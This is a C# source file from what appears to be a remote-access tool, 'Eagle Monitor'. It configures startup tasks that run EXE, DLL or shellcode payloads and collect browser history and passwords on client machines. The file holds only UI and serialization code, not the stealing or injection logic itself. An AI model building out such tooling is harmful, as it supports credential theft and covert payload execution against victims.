using Eagle_Monitor_Tasks_Configurator.Tasks;
using StartupTask;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using static Eagle_Monitor_Tasks_Configurator.ExectionTasks;
using static Eagle_Monitor_Tasks_Configurator.Helpers;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_Tasks_Configurator
{
    internal class TasksHelpers
    {
        internal static void SaveTasks(ListView listView)
        {
            List<ITasks> allTask = new List<ITasks>();
            foreach (ListViewItem tasks in listView.Items)
            {
                switch (tasks.ImageIndex)
                {
                    case 0:
                        ExectionTasks exectionTasksExe = new ExectionTasks();
                        if (tasks.SubItems[2].Text == "y")
                            exectionTasksExe.is64Bit = true;
                        else
                            exectionTasksExe.is64Bit = false;
                        exectionTasksExe.payloadType = (PayloadType)ushort.Parse(tasks.SubItems[1].Text);
                        exectionTasksExe.payloadPath = tasks.Tag.ToString();
                        exectionTasksExe.taskType = TaskType.TT_PAYLOAD_EXE;
                        allTask.Add(exectionTasksExe);
                        break;

                    case 1:
                        ExectionTasks exectionTasksDll = new ExectionTasks();
                        if (tasks.SubItems[2].Text == "y")
                            exectionTasksDll.is64Bit = true;
                        else
                            exectionTasksDll.is64Bit = false;
                        exectionTasksDll.payloadType = (PayloadType)ushort.Parse(tasks.SubItems[1].Text);
                        exectionTasksDll.payloadPath = tasks.Tag.ToString();
                        exectionTasksDll.entryPointForManagedDlls = tasks.SubItems[3].Text;
                        exectionTasksDll.taskType = TaskType.TT_PAYLOAD_DLL;
                        allTask.Add(exectionTasksDll);
                        break;

                    case 2:
                        ExectionTasks exectionTasksShellcode = new ExectionTasks();
                        if (tasks.SubItems[2].Text == "y")
                            exectionTasksShellcode.is64Bit = true;
                        else
                            exectionTasksShellcode.is64Bit = false;
                        exectionTasksShellcode.payloadType = (PayloadType)ushort.Parse(tasks.SubItems[1].Text);
                        exectionTasksShellcode.payloadPath = tasks.Tag.ToString();
                        exectionTasksShellcode.taskType = TaskType.TT_PAYLOAD_SHELL;
                        allTask.Add(exectionTasksShellcode);
                        break;

                    case 3:
                        HistoryTask historyTask = new HistoryTask();
                        historyTask.taskType = TaskType.TT_HISTORY;
                        allTask.Add(historyTask);
                        break;

                    case 4:
                        PasswordTask passwordTask = new PasswordTask();
                        passwordTask.taskType = TaskType.TT_PASSWORD;
                        allTask.Add(passwordTask);
                        break;
                }
            }
            byte[] savedTasks = allTask.SerializeTask();
            File.WriteAllBytes(GPath + "\\startuptask.dat", savedTasks);
        }

        internal static void PayloadAdder(ListView listView) 
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string file in openFileDialog.FileNames)
                    {
                        ListViewItem payload = new ListViewItem(Helpers.SplitPath(file));
                        payload.Tag = file;

                        string payloadType = Microsoft.VisualBasic.Interaction.InputBox("Payload type :" +
                            "\nMANAGED_DLL  =    0" +
                            "\nMANAGED_EXE  =    1" +
                            "\nNATIVE_DLL   =    2" +
                            "\nNATIVE_EXE   =    3" +
                            "\nSHELLCODE    =    4", file);


                        string is64bit = Microsoft.VisualBasic.Interaction.InputBox("Architecture (64 bit = y, 32 bit = n):");
                        string managedEntryPoint = "";
                        switch ((PayloadType)ushort.Parse(payloadType))
                        {
                            case PayloadType.MANAGED_DLL:
                                managedEntryPoint = Microsoft.VisualBasic.Interaction.InputBox("DLL Entrypoint(Namespace.Class.Function):");
                                payload.ImageIndex = 1;
                                break;

                            case PayloadType.NATIVE_DLL:
                                payload.ImageIndex = 1;
                                break;

                            case PayloadType.MANAGED_EXE:
                                payload.ImageIndex = 0;
                                break;

                            case PayloadType.NATIVE_EXE:
                                payload.ImageIndex = 0;
                                break;

                            case PayloadType.SHELLCODE:
                                payload.ImageIndex = 2;
                                break;

                            default:
                                return;

                        }
                        payload.SubItems.Add(payloadType.ToString());
                        payload.SubItems.Add(is64bit);
                        payload.SubItems.Add(managedEntryPoint);
                        listView.Items.Add(payload);
                    }
                }
            }
        }

        internal static void PayloadDragDropAdder(string[] files, ListView listView) 
        {
            foreach (string file in files)
            {
                ListViewItem payload = new ListViewItem(Helpers.SplitPath(file));
                payload.Tag = file;

                string payloadType = Microsoft.VisualBasic.Interaction.InputBox("Payload type :" +
                    "\nMANAGED_DLL  =    0" +
                    "\nMANAGED_EXE  =    1" +
                    "\nNATIVE_DLL   =    2" +
                    "\nNATIVE_EXE   =    3" +
                    "\nSHELLCODE    =    4", file);


                string is64bit = Microsoft.VisualBasic.Interaction.InputBox("Architecture (64 bit = y, 32 bit = n):");
                string managedEntryPoint = "";
                switch ((PayloadType)ushort.Parse(payloadType))
                {
                    case PayloadType.MANAGED_DLL:
                        managedEntryPoint = Microsoft.VisualBasic.Interaction.InputBox("DLL Entrypoint(Namespace.Class.Function):");
                        payload.ImageIndex = 1;
                        break;

                    case PayloadType.NATIVE_DLL:
                        payload.ImageIndex = 1;
                        break;

                    case PayloadType.MANAGED_EXE:
                        payload.ImageIndex = 0;
                        break;

                    case PayloadType.NATIVE_EXE:
                        payload.ImageIndex = 0;
                        break;

                    case PayloadType.SHELLCODE:
                        payload.ImageIndex = 2;
                        break;

                    default:
                        return;

                }
                payload.SubItems.Add(payloadType.ToString());
                payload.SubItems.Add(is64bit);
                payload.SubItems.Add(managedEntryPoint);
                listView.Items.Add(payload);
            }
        }

        internal static void TasksParser(ListView listView) 
        {
            if (File.Exists(GPath + "\\startuptask.dat"))
            {
                byte[] serialized = File.ReadAllBytes(GPath + "\\startuptask.dat");
                List<ITasks> allTask = serialized.DeserializeTask();
                foreach (ITasks task in allTask)
                {
                    ListViewItem listViewItem = new ListViewItem();
                    switch (task.taskType)
                    {
                        case TaskType.TT_PAYLOAD_EXE:
                            listViewItem.ImageIndex = 0;
                            ExectionTasks exectionTasksExe = (ExectionTasks)task;
                            listViewItem.Text = Helpers.SplitPath(exectionTasksExe.payloadPath);
                            listViewItem.Tag = exectionTasksExe.payloadPath;
                            listViewItem.SubItems.Add(((ushort)exectionTasksExe.payloadType).ToString());
                            if (exectionTasksExe.is64Bit)
                                listViewItem.SubItems.Add("y");
                            else
                                listViewItem.SubItems.Add("n");
                            break;

                        case TaskType.TT_PAYLOAD_DLL:
                            listViewItem.ImageIndex = 1;
                            ExectionTasks exectionTasksDll = (ExectionTasks)task;
                            listViewItem.Text = Helpers.SplitPath(exectionTasksDll.payloadPath);
                            listViewItem.Tag = exectionTasksDll.payloadPath;
                            listViewItem.SubItems.Add(((ushort)exectionTasksDll.payloadType).ToString());
                            if (exectionTasksDll.is64Bit)
                                listViewItem.SubItems.Add("y");
                            else
                                listViewItem.SubItems.Add("n");

                            listViewItem.SubItems.Add(exectionTasksDll.entryPointForManagedDlls);
                            break;

                        case TaskType.TT_PAYLOAD_SHELL:
                            listViewItem.ImageIndex = 2;
                            ExectionTasks exectionTasksShellcode = (ExectionTasks)task;
                            listViewItem.Text = Helpers.SplitPath(exectionTasksShellcode.payloadPath);
                            listViewItem.Tag = exectionTasksShellcode.payloadPath;
                            listViewItem.SubItems.Add(((ushort)exectionTasksShellcode.payloadType).ToString());
                            if (exectionTasksShellcode.is64Bit)
                                listViewItem.SubItems.Add("y");
                            else
                                listViewItem.SubItems.Add("n");
                            break;

                        case TaskType.TT_HISTORY:
                            listViewItem.Text = "History";
                            listViewItem.ImageIndex = 3;
                            break;

                        case TaskType.TT_PASSWORD:
                            listViewItem.Text = "Password";
                            listViewItem.ImageIndex = 4;
                            break;
                    }
                    listView.Items.Add(listViewItem);
                }
            }
        }
    }
}
